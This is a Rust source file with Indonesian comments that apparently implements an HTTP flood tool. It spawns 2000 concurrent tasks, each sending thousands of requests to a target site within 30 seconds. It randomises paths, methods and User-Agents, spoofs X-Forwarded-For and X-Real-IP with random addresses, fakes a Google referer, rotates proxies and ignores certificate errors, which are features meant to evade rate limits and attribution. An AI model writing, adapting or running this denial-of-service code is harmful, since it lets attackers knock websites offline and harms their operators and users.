use std::sync::Arc;
use std::time::{Duration, Instant};
use rand::{seq::SliceRandom, Rng};
use reqwest::{Client, Proxy};
use tokio::sync::Barrier;
use futures::future::join_all;

const PATHS: &[&str] = &[
    "/", "/?page=1", "/?category=news", "/?sort=newest", "/random", "/api", "/search?q=test",
    // Tambah path random lain sesuai kebutuhan
];
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    // Tambah User-Agent random lain
];
const METHODS: &[&str] = &["GET", "POST", "HEAD"];

fn random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!("{}.{}.{}.{}", rng.gen_range(1..255), rng.gen_range(0..255), rng.gen_range(0..255), rng.gen_range(1..255))
}

#[tokio::main]
async fn main() {
    // Konfigurasi
    let target_base = "https://webkamu.com";
    let duration_sec = 30;
    let threads = 2000;
    let req_per_thread = 5000;
    let proxies: Vec<&str> = vec![]; // isi proxy SOCKS5/HTTP jika perlu

    let barrier = Arc::new(Barrier::new(threads + 1));
    let start = Instant::now();
    let mut handles = Vec::with_capacity(threads);

    for i in 0..threads {
        let barrier = barrier.clone();
        let base = target_base.to_string();
        let proxies = proxies.clone();

        handles.push(tokio::spawn(async move {
            barrier.wait().await;
            let mut rng = rand::thread_rng();
            let mut client_builder = Client::builder()
                .danger_accept_invalid_certs(true)
                .http2_prior_knowledge();

            // Random proxy jika ada
            if !proxies.is_empty() {
                let proxy = proxies.choose(&mut rng).unwrap();
                client_builder = client_builder.proxy(Proxy::all(*proxy).unwrap());
            }
            let client = client_builder.build().unwrap();

            let mut ok = 0;
            let mut fail = 0;

            for _ in 0..req_per_thread {
                if start.elapsed().as_secs() > duration_sec { break; }
                // Random path, method, headers
                let path = PATHS.choose(&mut rng).unwrap();
                let url = format!("{}{}", base, path);

                let method = METHODS.choose(&mut rng).unwrap();
                let user_agent = USER_AGENTS.choose(&mut rng).unwrap();
                let fake_ip = random_ip();

                let mut req = client.request(method.parse().unwrap(), &url)
                    .timeout(Duration::from_secs(4))
                    .header("User-Agent", *user_agent)
                    .header("X-Forwarded-For", &fake_ip)
                    .header("X-Real-IP", &fake_ip)
                    .header("Referer", "https://google.com");

                // Tambah random header lain sesuai kebutuhan...

                let resp = req.send().await;
                match resp {
                    Ok(_) => ok += 1,
                    Err(_) => fail += 1,
                }
            }
            (ok, fail)
        }));
    }

    barrier.wait().await;
    let results = join_all(handles).await;
    let mut total_ok = 0;
    let mut total_fail = 0;
    for res in results {
        let (ok, fail) = res.unwrap();
        total_ok += ok;
        total_fail += fail;
    }
    println!("Selesai! Sukses: {}, Gagal: {}", total_ok, total_fail);
}
